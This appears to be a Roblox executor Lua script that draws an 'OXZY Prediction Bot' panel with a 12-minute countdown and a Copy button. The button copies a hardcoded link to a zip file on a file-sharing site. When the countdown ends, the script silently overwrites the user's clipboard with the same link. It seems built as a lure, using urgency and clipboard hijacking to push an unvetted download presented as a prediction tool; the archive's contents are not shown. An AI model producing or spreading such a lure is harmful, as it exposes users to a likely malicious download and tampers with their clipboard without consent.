local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")

-- Eski GUI varsa temizle
if CoreGui:FindFirstChild("OxzyMenu") then
    CoreGui.OxzyMenu:Destroy()
end

-- ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "OxzyMenu"
screenGui.ResetOnSpawn = false
screenGui.Parent = CoreGui

-- Ana Pencere
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 280, 0, 190)
mainFrame.Position = UDim2.new(0.5, -140, 0.4, -95)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 10)
mainCorner.Parent = mainFrame

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(60, 60, 60)
mainStroke.Thickness = 1
mainStroke.Parent = mainFrame

-- Sürükleme Özelliği (Drag)
local dragging, dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

mainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- Başlık Barı
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -40, 0, 35)
titleLabel.Position = UDim2.new(0, 10, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "OXZY Prediction Bot"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.TextSize = 18
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Parent = mainFrame

-- Kapatma / Gizleme Butonu (X)
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 5)
closeBtn.BackgroundTransparency = 1
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
closeBtn.Font = Enum.Font.SourceSansBold
closeBtn.TextSize = 18
closeBtn.Parent = mainFrame

-- Ekranın Soluna Küçük Açma Butonu
local openBtn = Instance.new("TextButton")
openBtn.Name = "OpenButton"
openBtn.Size = UDim2.new(0, 80, 0, 35)
openBtn.Position = UDim2.new(0, 10, 0.5, -17)
openBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
openBtn.Text = "OXZY"
openBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
openBtn.Font = Enum.Font.SourceSansBold
openBtn.TextSize = 16
openBtn.Visible = false
openBtn.Parent = screenGui

local openCorner = Instance.new("UICorner")
openCorner.CornerRadius = UDim.new(0, 8)
openCorner.Parent = openBtn

closeBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
    openBtn.Visible = true
end)

openBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = true
    openBtn.Visible = false
end)

-- Sayaç Label
local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.new(1, 0, 0, 45)
timerLabel.Position = UDim2.new(0, 0, 0.25, 0)
timerLabel.BackgroundTransparency = 1
timerLabel.Text = "12:00"
timerLabel.TextColor3 = Color3.fromRGB(0, 230, 120)
timerLabel.Font = Enum.Font.SourceSansBold
timerLabel.TextSize = 32
timerLabel.Parent = mainFrame

-- Copy Butonu
local copyBtn = Instance.new("TextButton")
copyBtn.Size = UDim2.new(0.85, 0, 0, 40)
copyBtn.Position = UDim2.new(0.075, 0, 0.65, 0)
copyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
copyBtn.Text = "Copy"
copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
copyBtn.Font = Enum.Font.SourceSansBold
copyBtn.TextSize = 16
copyBtn.Parent = mainFrame

local copyCorner = Instance.new("UICorner")
copyCorner.CornerRadius = UDim.new(0, 6)
copyCorner.Parent = copyBtn

local targetLink = "https://dosya.co/hbuw3j0vt3nw/oxzy-prediction-bot.zip.html"

copyBtn.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(targetLink)
        copyBtn.Text = "Copied!"
        task.wait(1.5)
        copyBtn.Text = "Copy"
    end
end)

-- Sayaç Mantığı (12 Dakika)
local totalSeconds = 12 * 60

task.spawn(function()
    while totalSeconds > 0 do
        local m = math.floor(totalSeconds / 60)
        local s = totalSeconds % 60
        timerLabel.Text = string.format("%02d:%02d", m, s)
        task.wait(1)
        totalSeconds = totalSeconds - 1
    end
    
    timerLabel.Text = "Süre Bitti!"
    timerLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
    
    if setclipboard then
        setclipboard(targetLink)
    end
end)

